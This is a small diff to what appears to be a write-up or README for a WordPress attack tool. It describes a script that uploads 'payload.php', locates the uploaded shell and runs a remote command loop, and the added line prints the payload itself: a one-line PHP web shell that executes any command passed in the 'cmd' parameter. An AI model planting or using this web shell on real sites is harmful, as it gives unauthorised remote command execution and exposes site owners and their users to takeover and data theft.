@@ -229,7 +229,7 @@ WordPress admin:
 
 `script.py` automates:
 
-- Uploading `payload.php`  
+- Uploading `payload.php` (`<?php echo shell_exec($_GET['cmd']); ?>`)
 - Resolving the uploaded shell path  
 - Starting an RCE command loop
 
